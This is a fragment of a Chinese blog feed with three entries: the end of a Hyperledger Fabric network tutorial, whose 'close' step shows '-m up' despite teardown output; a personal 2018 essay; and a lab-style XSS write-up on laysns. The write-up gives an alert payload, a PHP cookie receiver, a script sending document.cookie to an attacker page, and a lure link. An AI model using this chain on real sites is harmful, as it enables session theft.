class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">Creating network &quot;net_byfn&quot; with the default driver</span><br><span class="line">Creating volume &quot;net_peer0.org2.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer1.org2.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer1.org1.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer0.org1.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_orderer.example.com&quot; with default driver</span><br><span class="line">Creating peer1.org2.example.com ... done</span><br><span class="line">Creating peer0.org2.example.com ... done</span><br><span class="line">Creating peer1.org1.example.com ... done</span><br><span class="line">Creating peer0.org1.example.com ... done</span><br><span class="line">Creating orderer.example.com    ... done</span><br><span class="line">Creating cli                    ... done</span><br><span class="line"></span><br><span class="line"> ____    _____      _      ____    _____ </span><br><span class="line">/ ___|  |_   _|    / \    |  _ \  |_   _|</span><br><span class="line">\___ \    | |     / _ \   | |_) |   | |  </span><br><span class="line"> ___) |   | |    / ___ \  |  _ &lt;    | |  </span><br><span class="line">|____/    |_|   /_/   \_\ |_| \_\   |_|  </span><br><span class="line"></span><br><span class="line">Build your first network (BYFN) end-to-end test</span><br><span class="line"></span><br><span class="line">+ peer channel create -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/channel.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">Channel name : mytest1</span><br><span class="line">Creating channel...</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:35.602 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:35.801 UTC [cli.common] readBlock -&gt; INFO 002 Received block: 0</span><br><span class="line">===================== Channel &apos;mytest1&apos; created ===================== </span><br><span class="line"></span><br><span class="line">Having all peers join the channel...</span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:36.041 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:36.177 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer0.org1 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:39.396 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:39.473 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer1.org1 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:42.656 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:42.729 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer0.org2 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:45.890 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:45.990 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer1.org2 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Updating anchor peers for org1...</span><br><span class="line">+ peer channel update -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/Org1MSPanchors.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:49.159 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:49.208 UTC [channelCmd] update -&gt; INFO 002 Successfully submitted channel update</span><br><span class="line">===================== Anchor peers updated for org &apos;Org1MSP&apos; on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Updating anchor peers for org2...</span><br><span class="line">+ peer channel update -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/Org2MSPanchors.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:52.409 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:52.441 UTC [channelCmd] update -&gt; INFO 002 Successfully submitted channel update</span><br><span class="line">===================== Anchor peers updated for org &apos;Org2MSP&apos; on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Installing chaincode on peer0.org1...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:55.668 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:55.668 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:03:58.029 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer0.org1 ===================== </span><br><span class="line"></span><br><span class="line">Install chaincode on peer0.org2...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:58.241 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:58.241 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:03:58.597 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer0.org2 ===================== </span><br><span class="line"></span><br><span class="line">Instantiating chaincode on peer0.org2...</span><br><span class="line">+ peer chaincode instantiate -o orderer.example.com:7050 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem -C mytest1 -n mycc -l golang -v 1.0 -c &apos;&#123;&quot;Args&quot;:[&quot;init&quot;,&quot;a&quot;,&quot;100&quot;,&quot;b&quot;,&quot;200&quot;]&#125;&apos; -P &apos;AND (&apos;\&apos;&apos;Org1MSP.peer&apos;\&apos;&apos;,&apos;\&apos;&apos;Org2MSP.peer&apos;\&apos;&apos;)&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:58.812 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:58.812 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">===================== Chaincode is instantiated on peer0.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Querying chaincode on peer0.org1...</span><br><span class="line">===================== Querying on peer0.org1 on channel &apos;mytest1&apos;... ===================== </span><br><span class="line">Attempting to Query peer0.org1 ...3 secs</span><br><span class="line">+ peer chaincode query -C mytest1 -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">100</span><br><span class="line">===================== Query successful on peer0.org1 on channel &apos;mytest1&apos; ===================== </span><br><span class="line">Sending invoke transaction on peer0.org1 peer0.org2...</span><br><span class="line">+ peer chaincode invoke -o orderer.example.com:7050 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem -C mytest1 -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt -c &apos;&#123;&quot;Args&quot;:[&quot;invoke&quot;,&quot;a&quot;,&quot;b&quot;,&quot;10&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:06:36.914 UTC [chaincodeCmd] chaincodeInvokeOrQuery -&gt; INFO 001 Chaincode invoke successful. result: status:200 </span><br><span class="line">===================== Invoke transaction successful on peer0.org1 peer0.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Installing chaincode on peer1.org2...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:06:37.117 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:06:37.117 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:06:37.506 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer1.org2 ===================== </span><br><span class="line"></span><br><span class="line">Querying chaincode on peer1.org2...</span><br><span class="line">===================== Querying on peer1.org2 on channel &apos;mytest1&apos;... ===================== </span><br><span class="line">Attempting to Query peer1.org2 ...3 secs</span><br><span class="line">+ peer chaincode query -C mytest1 -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">90</span><br><span class="line">===================== Query successful on peer1.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">========= All GOOD, BYFN execution completed =========== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> _____   _   _   ____   </span><br><span class="line">| ____| | \ | | |  _ \  </span><br><span class="line">|  _|   |  \| | | | | | </span><br><span class="line">| |___  | |\  | | |_| | </span><br><span class="line">|_____| |_| \_| |____/</span><br></pre></td></tr></table></figure><h4 id="4、关闭网络"><a href="#4、关闭网络" class="headerlink" title="4、关闭网络"></a>4、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m up -c mytest1</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Stopping cli                    ... done</span><br><span class="line">Stopping peer0.org1.example.com ... done</span><br><span class="line">Stopping orderer.example.com    ... done</span><br><span class="line">Stopping peer0.org2.example.com ... done</span><br><span class="line">Stopping peer1.org1.example.com ... done</span><br><span class="line">Stopping peer1.org2.example.com ... done</span><br><span class="line">Removing cli                    ... done</span><br><span class="line">Removing peer0.org1.example.com ... done</span><br><span class="line">Removing orderer.example.com    ... done</span><br><span class="line">Removing peer0.org2.example.com ... done</span><br><span class="line">Removing peer1.org1.example.com ... done</span><br><span class="line">Removing peer1.org2.example.com ... done</span><br><span class="line">Removing network net_byfn</span><br><span class="line">Removing volume net_peer0.org3.example.com</span><br><span class="line">WARNING: Volume net_peer0.org3.example.com not found.</span><br><span class="line">Removing volume net_peer1.org3.example.com</span><br><span class="line">WARNING: Volume net_peer1.org3.example.com not found.</span><br><span class="line">Removing volume net_orderer.example.com</span><br><span class="line">Removing volume net_peer0.org2.example.com</span><br><span class="line">Removing volume net_peer0.org1.example.com</span><br><span class="line">Removing volume net_peer1.org1.example.com</span><br><span class="line">Removing volume net_peer1.org2.example.com</span><br><span class="line">bf5553092b5a</span><br><span class="line">0198acc0e83e</span><br><span class="line">5c0dad0e5b89</span><br><span class="line">Untagged: dev-peer1.org2.example.com-mycc-1.0-26c2ef32838554aac4f7ad6f100aca865e87959c9a126e86d764c8d01f8346ab:latest</span><br><span class="line">Deleted: sha256:b550da58d9213e0d82d7f362212eb84f8bffa0d7751cdfcbaf3258ef75c3f24a</span><br><span class="line">Deleted: sha256:d7dced24e5ba3373a3c3bd736be0a351481a21df9209503a3fa93635e4aa7f46</span><br><span class="line">Deleted: sha256:36739293e8852c3feb37dd3e08eb20f3004494d8eec3cba05c134454178323b1</span><br><span class="line">Deleted: sha256:7190f5476edd042aa64c39fcf7909f194bdc10e85e02ee1cecf21add3756d8a1</span><br><span class="line">Untagged: dev-peer0.org1.example.com-mycc-1.0-384f11f484b9302df90b453200cfb25174305fce8f53f4e94d45ee3b6cab0ce9:latest</span><br><span class="line">Deleted: sha256:4db24b70e9fbd10b3b20b6255011d45ac7fb92a7ee9731b7f8cc6e681e1a0eb6</span><br><span class="line">Deleted: sha256:38880d76d92c07ca6477ab3a899d21f00f76801f05b4adb3aba58d5bcf224bde</span><br><span class="line">Deleted: sha256:23a054642ba1b7f84991df2611f22b2a0894ea81676ecc9bc124f50832d04f12</span><br><span class="line">Deleted: sha256:f1811e1e4784e9e4537e98ba4a1bb86e56ee070ea443a026dc61c1375d6f8c30</span><br><span class="line">Untagged: dev-peer0.org2.example.com-mycc-1.0-15b571b3ce849066b7ec74497da3b27e54e0df1345daff3951b94245ce09c42b:latest</span><br><span class="line">Deleted: sha256:0c1d56951ae35a8d9db90dc3decda420ca2cf0fcbaa8ccbc4aa580de9fdd58f0</span><br><span class="line">Deleted: sha256:4ccfcafb3212b0448c0a106f25f91c59c56d709fd374658d814ba853bc315991</span><br><span class="line">Deleted: sha256:51b7b0c6e633a94040cb799596a52a13480b3b90819594d5f5c5f17b1ecdc632</span><br><span class="line">Deleted: sha256:11473124d5b1ddfe7136f913791002059bbe8d466e2a931a87caf50e6166996f</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、准备阶段&quot;&gt;&lt;a href=&quot;#一、准备阶段&quot; class=&quot;headerlink&quot; title=&quot;一、准备阶段&quot;&gt;&lt;/a&gt;一、准备阶段&lt;/h3&gt;&lt;h4 id=&quot;1、系统软件源改为-aliyun&quot;&gt;&lt;a href=&quot;#1、系统软件源改为-aliyun&quot; cla
      
    
    </summary>
    
      <category term="区块链学习" scheme="https://j-kangel.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="blockchain" scheme="https://j-kangel.github.io/tags/blockchain/"/>
    
      <category term="hyperledger" scheme="https://j-kangel.github.io/tags/hyperledger/"/>
    
  </entry>
  
  <entry>
    <title>2019</title>
    <link href="https://j-kangel.github.io/2018/12/31/2018/"/>
    <id>https://j-kangel.github.io/2018/12/31/2018/</id>
    <published>2018-12-31T13:25:54.000Z</published>
    <updated>2019-04-04T06:52:27.487Z</updated>
    
    <content type="html"><![CDATA[<p>今天是2018年最后一天，也没多大感慨，只是闲得慌，随便瞎扯两句。我这人没有什么规划和目标，主要还是前方一片迷茫，没有具体的方向，所以2018所发生的事情大多是我没有预料到的。就像我现在一样，对2019并没有什么特别的期待。计划总是赶不上变化，遇见未知的自己又何尝不好呢？</p><p>我的2018还要从去年学校跨年晚会的那一刻说起，那是和轮滑社的朋友一起跨年，第一次体验学校的跨年晚会，和几个老朋友互道了新年快乐，然后就睡了。接下来的日子一如往昔，并没有什么特别的惊喜。</p><p>元旦到了基本就是要迎接期末考试了，于是大二上结束了，从后面的结果来看，我的考试还算顺利。我又在学校多呆了十天，主要是考科三。一切都很顺利，科三一遍过。后来暑假考了科四，2018，我拿到了驾驶证，从此再也不用担心无证驾驶被抓了。</p><p>回家之前，老爸突然说要给我买个单反。之前老爸就跟我说过，如果我大学拿到了奖学金就给我买单反。我差不多都快忘了这事，这是老爸又提起，他说：“早买早享受“。我觉得挺有道理，很多时候我们做某件事情都喜欢等，等最合适的时间，这样往往就错过了。于是，我有了自己的单反。我其实很早之前就想拥有一款单反，我喜欢照片最本真的样子。然后第二天就去了趟鼓浪屿，想去给相机开开光。那天下起“了小雨，虽然光源不太充足，但是也别有一般趣味。”群芳不厌寒中开，只为翘首盼君来。今日料知君将近，忙引甘露惹尘埃。“我写下了这首小诗来表达心中的喜悦。有人说，眼睛是天然的照相机。这句话不假。我觉得能拍出好的照片的有两种人，一种是学会创造美的人人，一种是发现美的人。想要拍出好的照片，首先眼睛里要有美的存在。眼睛用来发现美，相机用来定格美，如此，生活便美不胜收。</p><p>过年自然是要回家的。还是如往年一年，过年并没有多大的趣味，见几个老友，吹几场牛逼。但是2018不一样，没有趣味，但有感伤。姐姐出嫁了。我清楚的记得那天，上午还是热热闹闹的，等婚车把姐姐接走后，屋里边空荡荡的。老妈倚在门口，对我说：“家里突然少了个人还真有点不习惯”。我那天说了很少的话，姐姐被接走后，我点起了一根烟，发现尼古丁和焦油并没有大家说的那么神奇。后来喝了点啤酒，我其实是不抽烟也不喝酒的。然后头昏昏沉沉的就睡过去了。醒来发现还是空荡荡的。“人生几次此阵容，锣敲鼓捶，似烈马惊鸿。楼上郎妾秋波送，席间宾客欢声浓。 谁知喜事皆倥偬，苦烟浊酒，无济心事重。误以醉梦可消茕，醒来仍旧一场空。”只好填此《蝶恋花》聊以慰藉。</p><p>开学了，刚开始还是很舒服的，周末爬山去植物园，写了一篇小记：</p><p>”寒冬已逝，暖春悄至。恰近日，有灰云盗日，和风藏雨。遂携二三友，作爬山寻木之行。 久居室中，竟不知草木之涩，树花之美。每行两步，便惊于木叶之奇妆，叹于山间之空旷。渐行之，花欲盛，红似深宫娇娘起舞，紫如江湖侠女弄剑；树欲茂，青似少年驭马之英豪，墨如老僧念经之沉稳。至山顶，忽闻松涛阵阵，鸟声潺潺，心窃喜，此景山上有，山下哪得闻？ 置身于山中，唯愿闻之声可入耳，欲观之景可及目。故所闻所见，皆好声好色。叹之，无人之处，花开极盛！遂归记之。“</p><p>去了一次鼓浪屿拍建筑，清明去了东山岛。东山岛的海确实比厦门的好看，碧绿的海，还有贝壳可以捡。后来就渐渐进入了梦魇时期，盼望着这学期早点结束。</p><p>可能是对厦门的早餐过于失望，也可能是觉得好玩。我买了锅和油盐，然后早上就自己捣鼓早餐。有火腿、牛奶、鸡蛋、面包、水果等。体验了一把精致的生活，主要还是太麻烦，也可能是太懒，一个月之后，全部偃旗息鼓了。所以我决定，以后找个媳妇，首先教她做早餐，然后让她每天做给我吃哈哈哈。</p><p>期间过了一次生日，刚好20岁。还记得那天晚上，我在球场打球，没有任何准备。这是，体育部的一群人就冲上来了，他们手里都拿着不同的水果，水果上面写着祝福语。后来我们去了老张吃烧烤，他们还准备了蛋糕，上面写着“心之所向，身之所往”。那天确实很感动，已经很久没有什么能够打动我了。</p><p>5月11号，我去福州参加了信息安全铁人三项赛。那是我大学时期第一次参加比赛，那时的我真的是菜的抠脚，虽然现在是菜的抠手。但那次比赛之后，我有参加许多网络空间安全的比赛，渐渐的锻炼了自己，学到了不少东西，也获得不少奖项。我大学最终的方向也从此确定—-网络安全。直白点，就是黑客。这是一个漫长且有意思的事，我渐渐宅了起来，学习各种知识以及技术，希望某一天，你们懂得。。。</p><p>我有点乏了，有点写不下去了，感觉2018发生了好多事，记忆在不断交错重叠。</p><p>七月，暑假到了。我尝试留起了中分，拍了一组照片。后来姐姐生了，这意味着一个伟大的舅舅诞生了。小学期学了数据恢复，我在一张被格式化的内存卡里面会付出了300多张初中的照片。又再一次看到了青涩的自己，发现自己青涩如初。</p><p>哦，对了。2018，我听了一场GIN的演奏会，吉他上也有他的签名。我也看了一场五月天的演唱会，都是很不错的体验。</p><p>去了次婺源，徽派建筑确实像泼墨山水画。虽然没看到漫山遍野的花，但是晚秋之景也足以让人流连忘返。</p><p>后来开学了，开学之后就很少参加活动了，也很少出去玩。就感觉一直在不停的打比赛。然后就不停的拿奖哈哈，虽然奖项不高。</p><p>说起拿奖，我今年好像还拿了挺多奖的。填学年鉴定的时候，发现了一堆证书。室友看见了，说：“你怎么那么多证书？”我说：“我也不知道哪来这么多鬼东西”。然后我们就哈哈大笑。所有奖项里面最有含金量的当然是国奖，毕竟价值8000。有时候我也很奇怪，我没想过要拿国奖。在填写申请表的时候我才想到，何不试试呢?可能有运气加成，我知道自己几斤几两。</p><p>开学之前立了个flag，这学期尽量不迟到。然后，flag没倒，但是歪了。我差不多把要迟到的课都翘了，我这学期翘的课比我前20年翘的课加起来还多。翘课真的是会上瘾，人总是有侥幸心理。某次翘课没被抓，后面就会越翘越多。新年有个愿望，下学期就不翘课了。</p><p>我大概翘了一个学期的马原，因为它妨碍我搞钱了。说起搞钱，我现在不想读书不想恋爱只想搞钱。这学期除了拿奖学金，打比赛拿奖金之外，我还找了份兼职。我也不知道自己为什么会去找兼职，可能是暑假的时候玩多了太穷了吧，我还记得当时穷到把小黄的押金都退了。兼职是在一个托管班辅导小学生写作业，小学生都挺可爱的，满眼都是十多年前的自己。</p><p>还有什么呢？我记不起来了。哦，对，我买了vps，以后可以随心所欲的上外网了，我也可以“推特治国”了。2018吧，其实我觉得也不算快吧，发生了挺多事，遇见了不一样的自己。2019又会发生什么呢？谁知道呢？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天是2018年最后一天，也没多大感慨，只是闲得慌，随便瞎扯两句。我这人没有什么规划和目标，主要还是前方一片迷茫，没有具体的方向，所以2018所发生的事情大多是我没有预料到的。就像我现在一样，对2019并没有什么特别的期待。计划总是赶不上变化，遇见未知的自己又何尝不好呢？&lt;
      
    
    </summary>
    
      <category term="随笔" scheme="https://j-kangel.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="essay" scheme="https://j-kangel.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>xss_laysns</title>
    <link href="https://j-kangel.github.io/2018/12/26/xss_laysns/"/>
    <id>https://j-kangel.github.io/2018/12/26/xss_laysns/</id>
    <published>2018-12-26T14:40:22.000Z</published>
    <updated>2019-04-04T06:56:18.158Z</updated>
    
    <content type="html"><![CDATA[<p>0x00前言</p><p>这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击一波再说。</p><p>0x01漏洞检测</p><p>看到搜索框，心中就燃起了炽烈的求知欲。前段时间有个大佬教了我一段JS代码，一直不明白什么意思，不如搜一搜。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输入以上代码，就在按下回车的那一刻，突然弹出下面这么一个东西，下了我一跳。</p><p><img src="/2018/12/26/xss_laysns/1.png" alt=""></p><p>好了，果然存在反射型xss，开始攻击。</p><p>0x02跨站脚本攻击</p><p>在攻击之前，一直不明白，为什么这种漏洞叫Cross-site Script。一般测试都只是Script attack，并没有Cross-site。但实际攻击中的JS恶意代码肯定是在攻击者的站点下面。那么，实施什么攻击好呢？盗取cookie吧，简单又惬意。好了，不说废话了，上脚本。</p><p>首先在攻击站点创建cookie.txt用来接收cookie，创建hack.php作为手机cookie的接口，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[<span class="string">'q'</span>]; </span><br><span class="line"></span><br><span class="line">    var_dump($cookie); </span><br><span class="line"></span><br><span class="line">    $myFile = <span class="string">"cookie.txt"</span>; </span><br><span class="line"></span><br><span class="line">    file_put_contents($myFile, $cookie); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着创建JS脚本hack.js，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">img.src = <span class="string">"http://localhost/hack/hack.php?q="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure><p>最后创建一个HTML页面来诱导用户hack.html,代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://localhost/sns/search.html?ks=%3Cscript+</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">src%3Dhttp%3A%2F%2Flocalhost%2Fhack%2Fhack.js%3E%3C%2Fscript%3E&amp;commend=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">all&amp;ssid=s5-e&amp;search_type=item&amp;atype=&amp;filterFineness=&amp;rr=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">1&amp;pcat=food2011&amp;style=grid&amp;cat="</span>&gt;</span>click me<span class="tag">&lt;/<span 